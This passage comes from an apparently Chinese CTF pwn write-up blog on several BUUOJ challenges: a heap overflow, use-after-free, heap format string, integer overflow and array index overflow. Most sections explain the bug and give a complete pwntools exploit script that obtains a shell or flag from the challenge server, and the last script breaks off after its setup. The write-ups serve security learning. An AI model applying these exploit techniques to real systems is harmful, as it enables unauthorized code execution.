edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token string">'b *0x0401494'</span><span class="token punctuation">)</span>
<span class="token comment"># debug()</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>index<span class="token operator">=</span>i<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span>i<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#让fastbin中的ptr进入tcache</span>
ptr<span class="token operator">=</span><span class="token number">0x4040C0</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>ptr<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>简单，但又学到了东西，赢！知乎真的挺傻逼的，不想用了</p>
<h2 id="12-BUU-picoctf-2018-are-you-root（二级指针）"><a href="#12-BUU-picoctf-2018-are-you-root（二级指针）" class="headerlink" title="12.BUU picoctf_2018_are you root（二级指针）"></a>12.BUU picoctf_2018_are you root（二级指针）</h2><p>一道逻辑漏洞题目，挺有意思的，2.27的64位</p>
<p>程序逻辑是以一个用户名login，login后可以给用户设置level，level为5就可以得到flag，但要想level为5就要利用漏洞了。</p>
<p><img src="/images/v2-c889f4aef31639473206094ee0be98df_720w.png" alt="img"></p>
<p>除了自己申请了一个chunk，还会用到一个strdup函数，这个函数会通过malloc申请一段新空间，并将字符串存入。</p>
<p><img src="/images/v2-7a11e206a467a8edf2096e018125793e_720w.png" alt="img"></p>
<p>设置level，不能设置为5</p>
<p><img src="/images/v2-5bd70dcf6cd5182f723ca3592508f287_720w.png" alt="img"></p>
<p>如果level为5就可以getflag，reset会free掉book。有一个很重要的点，book并不是一个指针，而是一个二级指针，是一个指向指针的指针：</p>
<p><img src="/images/v2-ac3d56ea1bb6edaaec7e6a6b8b00a3c5_720w.png" alt="img"></p>
<p>如果我们login一次，那么堆空间是这样的：</p>
<p><img src="/images/v2-5ca8045285b81f221e54efe8113aa225_720w.png" alt="img"></p>
<p><img src="/images/v2-ac810439a1107623703d6102822ea37f_720w.png" alt="img"></p>
<p>第一个chunk是程序malloc的，book = (void *<em>)malloc(0x10uLL);，第二个chunk是strdup构造的</em>book = (void <em>)(int)strdup(username);因为book是一个二级指针，所以第一个chunk中存储 的是</em>book的值，也就是指向了strdup存放的username，这时候如果调用reset，就会free(<em>book);也就是将存放username的chunk给free掉，前8字节作为fd指针就会被置0，而后一个字节不会被置零，这道题就是利用这里来设置level，因为，我们再login一次，就会把这个chunk申请回来，而这里的05就是存储level的地址(</em>((_DWORD *)book + 2))，所以就可以getflag了</p>
<p><img src="/images/v2-57295fe9423d61959da68ce60f9bbd6c_720w.png" alt="img"></p>
<p><img src="/images/v2-db58e35d935c167b04df4723cd7a82f2_720w.png" alt="img"></p>
<p>给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28648</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'> '</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
<span class="token comment"># debug('b *0x400DEF')</span>
<span class="token comment"># debug()</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token string">b'login aaaaaaaa'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token string">b'reset'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token string">b'login aa'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token string">b'get-flag'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="13-BUU-xman-2019-format（堆上格式化字符串-爆破一位）"><a href="#13-BUU-xman-2019-format（堆上格式化字符串-爆破一位）" class="headerlink" title="13.BUU xman_2019_format（堆上格式化字符串_爆破一位）"></a>13.BUU xman_2019_format（堆上格式化字符串_爆破一位）</h2><p>一道32位的格式化字符串题目，没开PIE，但字符串是存储在堆上而不是栈上的，记录一下，程序主要就是读入，并printf，这里的strotoks函数是以|为界对字符串进行分割，取|前面的。</p>
<p><img src="/images/v2-26cb56340a9a792e776cccb5aa494fe7_720w.png" alt="img"></p>
<p><img src="/images/v2-01fb2a3e790168d60966a2854cecccf5_720w.png" alt="img"></p>
<p>并且给出了backdoor</p>
<p><img src="/images/v2-d832b6dbcc50ac9d9b87e6b3994d0cea_720w.png" alt="img"></p>
<p>所以很简单，只要把返回地址改为backdoor的地址就好了，但因为字符串保存在堆上，所以有一些地方要注意。先输入几个a来测试，可以看到我们的目标是修改ebp下面的返回地址为backdoor地址，那我们ebp这里的链，将这个链上的值进行修改，让其指向返回地址，再修改返回地址的值，在这次运行中，我们先来对0xffa98b98进行修改，将其最后一个字节改为4c（%76c%10$hhn），这样就会让这个链指向返回值所在的地址，这样ebp上的链就会变成0xffa98b68 —▸ 0xffa98b4c—▸ 0x804864b （差点又忘了格式化字符串改的是指针所指向的值），接下来注意看栈上，我们对0xffa98b68这里进行修改，就可以将返回地址0x804864b进行修改为backdoor了（%34219c%18$hn）。但需要爆破，因为栈上的位置是会变的，返回地址最后一个字节不会一直是0x4c，但最后四位c不会变，所以我们需要爆破最后一字节的前4位，从0-0xf，随便选一个进行爆破就好了。</p>
<p><img src="/images/v2-cdefd4d8c94265182f2a26261eb65918_720w.png" alt="img"></p>
<p>还有一个问题，因为字符串是存储在堆上的，所以如果我们直接写payload：%76c%10$hhn%34219c%18$hn是不行的，因为字符串在堆上的话，对栈的操作不会在执行完前面对栈的操作后进行再进行下一步的操作，而是会<strong>把所有对应偏移的地址先取出来，然后再去修改！</strong>也就是不会将执行%76c%10$hhn将链指向返回地址后再执行%34219c%18$hn来修改返回地址<strong>，</strong>而是会对当前栈上的第18个地址，<strong>也就是对还没有被修改最后一字节的0xffa98ba8进行修改。</strong></p>
<p>给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25835</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
<span class="token comment"># backdoor=0x080485AB</span>
<span class="token comment"># debug('bcall printf')</span>
<span class="token comment"># sh.send('%252c%10$hhn|%34219c%18$hn')</span>
<span class="token comment"># sh.send('aaaaa')</span>
<span class="token comment"># pause()</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token comment"># sh = process(filename)</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25835</span> <span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'...\n'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'...\n'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'%44c%10$hhn|%34219c%18$hn'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'...\n'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'...\n'</span><span class="token punctuation">)</span>
    
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        
        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'echo aaa'</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">,</span>timeout <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">continue</span>
        
        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="14-BUU-hgame2018-flag-server（整数溢出）"><a href="#14-BUU-hgame2018-flag-server（整数溢出）" class="headerlink" title="14.BUU hgame2018_flag_server（整数溢出）"></a>14.BUU hgame2018_flag_server（整数溢出）</h2><p>32位一道简单的整数溢出题，最开始以为要用ctypes来调用time和srand这些来和随机的pass做匹配（libc = cdll.LoadLibrary(‘libc-2.27.so’)失败了，不知道为啥），后面发现输入username长度的时候输入-1就可以了，可以输入更长的字符串，把v10给覆盖为1就好了</p>
<p><img src="/images/v2-c3a28334852fd8d043ca8613f580fec2_720w.png" alt="img"></p>
<p>给出exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">0</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
<span class="token comment"># libc = cdll.LoadLibrary('libc-2.27.so')</span>
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28078</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># debug('b *0x0804895B')</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'your username length: '</span><span class="token punctuation">,</span><span class="token string">'-1'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'whats your username?'</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
a<span class="token operator">=</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
a<span class="token operator">=</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token comment"># pause()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>非常简单，但居然没有想到，反思，还想了好一会为啥不能loadLibary，但为啥不能呢？</p>
<h2 id="15-BUU-qctf2018-stack2（数组溢出，返回位置）"><a href="#15-BUU-qctf2018-stack2（数组溢出，返回位置）" class="headerlink" title="15 BUU qctf2018_stack2（数组溢出，返回位置）"></a>15 BUU qctf2018_stack2（数组溢出，返回位置）</h2><p>一道32位，没开pie，数组溢出的题目，有一个点挺有意思的，没注意到搞了半天，<strong>遇到问题惯性思维不如好好调试。</strong>题目本身是一个计算器，输入多个数据后进行存储，可以修改，最后计算平均值，漏洞在于change number，没有检查数组的下标是否越界，还有backdoor，所以思路很简单，把<strong>返回地址</strong>修改为backdoor就行了</p>
<p><img src="/images/v2-0bea51bcf199a360fff1cdb711ab5780_720w.png" alt="img"></p>
<p><img src="/images/v2-67172598436c03762ad972bb89b8feec_720w.png" alt="img"></p>
<p><img src="/images/v2-433b6f123ba8f76f44428d9f2dcae61c_720w.png" alt="img"></p>
<p>注意到这道题的numlist是以char数组来存放的，所以每次只能写一个字节，一次一次写就好了，最后再退出，就可以到backdoor了。按照这个思路，我们首先确定偏移，numlist和返回地址的offset是0x74</p>
<p><img src="/images/v2-83b59f071bcf59f05dd0eb573947e147_720w.png" alt="img"></p>
<p><img src="/images/v2-cc61b142353de54cb43ee107517947d9_720w.png" alt="img"></p>
<p>到这里已经把backdoor写好了，但如果继续的话会不能getshell，我想了很久，以为哪里写错了，但怎么看backdoor都写进去了，最后还是调试以及看代码找到的问题，在退出时，leave ret中间有一个lea，这样就会更改掉esp的值，导致在ret后不会指向我们布置好的backdoor，看调试更明显，在指向了backdoor后因为做了一次lea，所以偏移了0x10，也就是说偏移后的地方才是真正的返回地址，所以真正的偏移不是0x74而是0x84</p>
<p><img src="/images/v2-30d000f43cd4597d46d1e1bf547a31fa_720w.png" alt="img"></p>
<p><img src="/images/v2-2b5ac2c9eecfa986ffc4df864d75077d_720w.png" alt="img"></p>
<p><img src="/images/v2-030d66b15d2681fd060e4c82a55a6247_720w.png" alt="img"></p>
<p>把偏移改成0x84即可，给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26980</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>


